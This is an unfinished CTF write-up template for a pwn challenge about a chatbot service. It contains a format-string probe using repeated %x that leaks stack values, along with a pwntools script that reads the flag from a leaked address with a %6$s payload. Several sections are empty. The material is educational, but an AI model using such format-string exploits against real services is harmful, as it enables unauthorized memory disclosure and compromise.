# Challenge Name - CTF Name
## Challenge Info
- Date: YYYY-MM-DD
- CTF Name:
- Category: web/pwn/rev/crypto/osint/misc
- Difficulty (subjective): easy/medium/hard
- Points:
- Provided Files:
- tools:
## Brief Description
With everything and everyone going AI today, we also are developing our own AI bot. It is a first draft and it still requires some work, but feel free to test it out.
## Initial Analysis
### Environment
### Code
## Vulnerability
## Exploit
### Strategy
아마 단어 기반으로 출력하는 듯?
FSB?
### Exploitation Steps
``` sh
Hi, what can I help you with today?
> flag
The flag is safely stored in 0x586556405040
```
``` sh
Is there anything what you want me to ask?
> AAAAAAAA %x %x %x %x %x %x %x %x %x %x %x %x
I'm sorry, I don't know about: AAAAAAAA c140a09f c140a090 1d c140a0c0 0 41414141 20782520 78252078 25207825 20782520 78252078 c140a0f0
```
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
### payload
``` python
from pwn import *

p = remote('simple-ai-bot.ctf.zone', 4242)

# flag addr
p.sendline(b'flag')
p.recvuntil('The flag is safely stored in ')
flag_addr = int(p.recvline()[2:], 16)
log.info(f'flag_addr: {hex(flag_addr)}')

# FSB
payload = b''
payload += p64(flag_addr)[:6] + b' %6$s'
cur_addr = p.sendline(payload)
# p.recvuntil(b'know about: ')
p.recvline()
flag = p.recvline()
log.info(f'flag: {flag}')

# interactive
p.interactive()
```
## Lessons Learned
## Mitigation Strategies(Remediation)